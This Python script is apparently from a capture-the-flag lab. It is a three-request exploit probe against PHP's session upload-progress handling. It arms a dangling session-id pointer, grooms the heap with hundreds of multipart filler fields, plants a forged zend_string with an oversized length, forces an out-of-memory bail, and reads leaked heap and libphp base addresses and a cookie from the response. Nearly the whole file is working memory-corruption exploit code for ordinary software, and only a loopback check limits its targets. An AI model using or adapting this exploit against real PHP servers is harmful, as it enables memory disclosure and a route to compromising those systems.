#!/usr/bin/env python3
"""Loopback-only stock-sid32 retained-forge A/B/C leak probe.

A arms the stock 32-byte session-id dangling pointer. B follows the
non-poison derived placement (841 48-byte fillers, then a 56-byte raw forge)
and preloads the forge copy's actual bin-96 class with live ext/filter copies
before forcing the measured copy OOM. MIME-key guards cannot be used here:
they are parsed before the forge and consume/reclassify the dangling page.
C is a WAF-padded multipart END request with bounded array fields and accepts
only a strict heap-plus-libphp cookie from C itself.
"""

from __future__ import annotations

import argparse
import json
import os
from pathlib import Path
import struct
import sys
import time
import urllib.parse


sys.path.insert(0, "/root/bridge")
sys.path.insert(0, "/root/bridge/stock")
sys.path.insert(0, "/root/chainetool-v106/e2e")
sys.path.insert(0, "/root/cfctf-mirror")

import bridge_common as bridge  # noqa: E402
import bridge_rank_reclaim_lab as ranklab  # noqa: E402


LOOPBACK = {"127.0.0.1", "localhost", "::1"}
PREAMBLE = 1_048_437
FILLERS = 841
FORGE_SIZE = 56
LEAK_LENGTH = 0x80000
DEFAULT_PRESSURE = 426_681
DEFAULT_BIN96_PRELOAD_FIELDS = 20
DEFAULT_DTOR = 0x7B47A0
MAX_BIN96_PRELOAD_FIELDS = 40
FLUSH_SID_BYTES = 48
MAX_FLUSH_ARRAYS = 900
MAX_FLUSH_CHAIN_DEPTH = 64
MAX_FLUSH_CHAIN_FIELDS = 16


def forge_value(leak_length: int) -> bytes:
    value = bytearray(FORGE_SIZE)
    struct.pack_into("<I", value, 0x00, 0)
    struct.pack_into("<I", value, 0x04, 0x16)
    struct.pack_into("<Q", value, 0x08, 0)
    struct.pack_into("<Q", value, 0x10, leak_length)
    value[0x18] = ord("/")
    return bytes(value)


def multipart_part(field: ranklab.Field) -> bytes:
    """Serialize the stock probe without admitting pre-forge MIME guards."""
    if not field.name or any(byte in field.name for byte in b'"\r\n'):
        raise ValueError("unsafe field name")
    header = (
        b"--" + bridge.DISC_BOUNDARY
        + b'\r\nContent-Disposition: form-data; name="'
        + field.name + b'"'
    )
    for key, value in field.extra_headers:
        if (
            not key
            or len(key) != ranklab.BIN80_GUARD_KEY_BYTES
            or any(byte <= 32 or byte >= 127 for byte in key)
            or b"\r" in value
            or b"\n" in value
        ):
            raise ValueError("unsafe stock copy-guard header")
        header += b"\r\n" + key + b": " + value
    if not 0 <= field.lf_pressure_lines <= ranklab.MAX_PRESSURE_LINES:
        raise ValueError("LF pressure lines out of range")
    if field.lf_pressure_lines:
        header += b"\r\n" + (b":\n" * field.lf_pressure_lines)
        return header + b"\r\n" + field.value + b"\r\n"
    return header + b"\r\n\r\n" + field.value + b"\r\n"


def finish_b_multipart(fields: tuple[ranklab.Field, ...]) -> bytes:
    return b"".join(multipart_part(field) for field in fields) + (
        b"--" + bridge.DISC_BOUNDARY + b"--\r\n"
    )


def stock_array_fields(count: int) -> list[ranklab.Field]:
    if not 0 <= count <= MAX_FLUSH_ARRAYS:
        raise ValueError(f"stock flush arrays must be in 0..{MAX_FLUSH_ARRAYS}")
    return [
        ranklab.Field(
            f"a{index:04d}[0]".encode("ascii"),
            b"x",
            role=f"array-{index}",
        )
        for index in range(count)
    ]


def stock_flush_body(
    arrays: int = 150,
    chain_depth: int = 0,
    chain_fields: int = 1,
) -> bytes:
    """Reach END without allocating a bin-64 registered session carrier.

    A 32-byte carrier becomes a 64-byte zend_string and overwrites the retained
    stock forge before END.  A 48-byte carrier is accepted by the upload-
    progress formdata callback but its registered copies are bin 80.
    """
    fields = [
        ranklab.Field(b"PHPSESSID", b"S" * FLUSH_SID_BYTES, role="session-carrier-bin80"),
        ranklab.Field(
            b"PHP_SESSION_UPLOAD_PROGRESS",
            b"pwn",
            role="progress-trigger",
        ),
    ]
    if not 0 <= chain_depth <= MAX_FLUSH_CHAIN_DEPTH:
        raise ValueError(
            f"stock flush chain depth must be in 0..{MAX_FLUSH_CHAIN_DEPTH}"
        )
    if not 0 <= chain_fields <= MAX_FLUSH_CHAIN_FIELDS:
        raise ValueError(
            f"stock flush chain fields must be in 0..{MAX_FLUSH_CHAIN_FIELDS}"
        )
    if chain_depth:
        fields.extend(
            ranklab.Field(
                f"r{index:02d}".encode("ascii") + (b"[x]" * chain_depth),
                b"x",
                role=f"bin56-live-chain-{index}-{chain_depth}",
            )
            for index in range(chain_fields)
        )
    fields.extend(stock_array_fields(arrays))
    return ranklab.finish_multipart(tuple(fields))


def build_b_fields(pressure: int, bin96_preload_fields: int) -> tuple[ranklab.Field, ...]:
    fields = ranklab.carrier_fields()
    fields.extend(
        ranklab.Field(
            ranklab.filler_name(index),
            ranklab.filler48(index),
            role=f"filler-{index}",
        )
        for index in range(FILLERS)
    )
    fields.extend(
        ranklab.Field(
            f"g{index:02d}".encode("ascii"),
            b"G" * FORGE_SIZE,
            role=f"bin96-live-preload-{index}",
        )
        for index in range(bin96_preload_fields)
    )
    fields.append(
        ranklab.Field(
            b"1999",
            forge_value(LEAK_LENGTH),
            extra_headers=(),
            lf_pressure_lines=pressure,
            role="stock-bin64-forge",
        )
    )
    # These do not execute when B bails at the intended post-raw boundary,
    # but retain the exact non-poison derived request shape.
    fields.extend(ranklab.array_fields(40))
    if len(fields) > ranklab.MAX_FIELDS:
        raise ValueError("B exceeds max_input_vars")
    return tuple(fields)


def write_exclusive(path: Path, document: dict) -> None:
    payload = (json.dumps(document, indent=2, sort_keys=True) + "\n").encode()
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    descriptor = os.open(path, flags, 0o600)
    try:
        os.write(descriptor, payload)
        os.fsync(descriptor)
    finally:
        os.close(descriptor)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True)
    parser.add_argument("--pressure-lines", type=int, default=DEFAULT_PRESSURE)
    parser.add_argument(
        "--bin96-preload-fields",
        type=int,
        default=DEFAULT_BIN96_PRELOAD_FIELDS,
    )
    parser.add_argument("--preamble", type=int, default=PREAMBLE)
    parser.add_argument("--dtor", type=lambda value: int(value, 0), default=DEFAULT_DTOR)
    parser.add_argument("--flush-arrays", type=int, default=150)
    parser.add_argument("--flush-chain-depth", type=int, default=0)
    parser.add_argument("--flush-chain-fields", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=120.0)
    parser.add_argument("--out", type=Path, required=True)
    parser.add_argument("--cookie-out", type=Path)
    args = parser.parse_args()

    target = urllib.parse.urlsplit(args.target)
    if not (
        target.scheme == "http"
        and target.hostname in LOOPBACK
        and target.path == "/index.php"
        and target.port is not None
        and not target.query
        and not target.fragment
        and target.username is None
        and target.password is None
    ):
        parser.error("target must be a loopback /index.php URL")
    if not 0 <= args.pressure_lines <= ranklab.MAX_PRESSURE_LINES:
        parser.error("pressure-lines out of range")
    if not 0 <= args.bin96_preload_fields <= MAX_BIN96_PRELOAD_FIELDS:
        parser.error("bin96-preload-fields out of range")
    if not 0 <= args.flush_arrays <= MAX_FLUSH_ARRAYS:
        parser.error("flush-arrays out of range")
    if not 0 <= args.flush_chain_depth <= MAX_FLUSH_CHAIN_DEPTH:
        parser.error("flush-chain-depth out of range")
    if not 0 <= args.flush_chain_fields <= MAX_FLUSH_CHAIN_FIELDS:
        parser.error("flush-chain-fields out of range")
    if not 1_000_000 <= args.preamble <= 1_100_000:
        parser.error("preamble out of range")
    output = args.out.resolve()
    cookie_output = args.cookie_out.resolve() if args.cookie_out else None
    outputs = [output] + ([cookie_output] if cookie_output else [])
    if len(set(outputs)) != len(outputs):
        parser.error("receipt and cookie outputs must differ")
    if any(os.path.lexists(path) or not path.parent.is_dir() for path in outputs):
        parser.error("fresh output in an existing directory required")

    a_native = ranklab.arm_body(ranklab.ARM_PROFILE_CHALLENGE)
    b_fields = build_b_fields(args.pressure_lines, args.bin96_preload_fields)
    b_native = finish_b_multipart(b_fields)
    c_native = stock_flush_body(
        args.flush_arrays,
        args.flush_chain_depth,
        args.flush_chain_fields,
    )
    a_wire = bridge.preamble_pad(a_native, args.preamble)
    b_wire = bridge.preamble_pad(b_native, args.preamble)
    c_wire = bridge.preamble_pad(c_native, args.preamble)

    host = target.hostname or ""
    began = time.monotonic()
    a_raw = ranklab.exchange(
        host, target.port, target.path, a_wire, bridge.ARM_BOUNDARY, args.timeout
    )
    b_raw = ranklab.exchange(
        host, target.port, target.path, b_wire, bridge.DISC_BOUNDARY, args.timeout
    )
    a, _ = ranklab.response_record(a_raw, args.dtor)
    b, _ = ranklab.response_record(b_raw, args.dtor)
    b_gate = (
        b["status"] == 200
        and b["oom"]
        and b["oom_tried_bytes"] == 4096
    )
    if b_gate:
        c_raw = ranklab.exchange(
            host, target.port, target.path, c_wire, bridge.DISC_BOUNDARY, args.timeout
        )
        c, cookie = ranklab.response_record(c_raw, args.dtor)
    else:
        c = None
        cookie = b""
    gates = {
        "a_arm_oom": a["status"] == 200 and a["oom"],
        "b_post_raw_oom": b_gate,
        "c_strict_dual_base": bool(
            c and c["status"] == 200 and c["strict_dual_base"]
        ),
    }
    document = {
        "schema": "cfctf-r8/stock-bin64-retained-flush-lab/v3",
        "target": args.target,
        "scope": {
            "loopback_only": True,
            "request_cap": 3,
            "poison_required": True,
        },
        "geometry": {
            "sid_bytes": 32,
            "fillers": FILLERS,
            "forge_size": FORGE_SIZE,
            "leak_length": LEAK_LENGTH,
            "guard_count": 0,
            "copy_preload_bin": 96,
            "copy_preload_fields": args.bin96_preload_fields,
            "copy_preload_live_copies": 2 * args.bin96_preload_fields,
            "pressure_lines": args.pressure_lines,
            "pressure_plus_copy_guards": (
                args.pressure_lines + args.bin96_preload_fields
            ),
            "b_arrays_after_forge": 40,
            "c_arrays": args.flush_arrays,
            "c_chain_depth": args.flush_chain_depth,
            "c_chain_fields": args.flush_chain_fields,
            "c_session_carrier_bytes": FLUSH_SID_BYTES,
            "preamble": args.preamble,
            "dtor": hex(args.dtor),
        },
        "wire": {
            "a_bytes": len(a_wire),
            "b_bytes": len(b_wire),
            "c_bytes": len(c_wire),
        },
        "a": a,
        "b": b,
        "c": c,
        "gates": gates,
        "request_count": 2 + int(b_gate),
        "elapsed_s": round(time.monotonic() - began, 3),
        "verdict": (
            "STRICT_DUAL_BASE_C" if all(gates.values()) else "RETAINED_FLUSH_MISS"
        ),
    }
    if cookie_output is not None and cookie:
        flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
        if hasattr(os, "O_NOFOLLOW"):
            flags |= os.O_NOFOLLOW
        descriptor = os.open(cookie_output, flags, 0o600)
        try:
            os.write(descriptor, cookie)
            os.fsync(descriptor)
        finally:
            os.close(descriptor)
        document["cookie_output"] = str(cookie_output)
    elif cookie_output is not None:
        document["cookie_output"] = None
    write_exclusive(output, document)
    print(json.dumps(document, indent=2, sort_keys=True))
    return 0 if document["verdict"] == "STRICT_DUAL_BASE_C" else 2


if __name__ == "__main__":
    raise SystemExit(main())
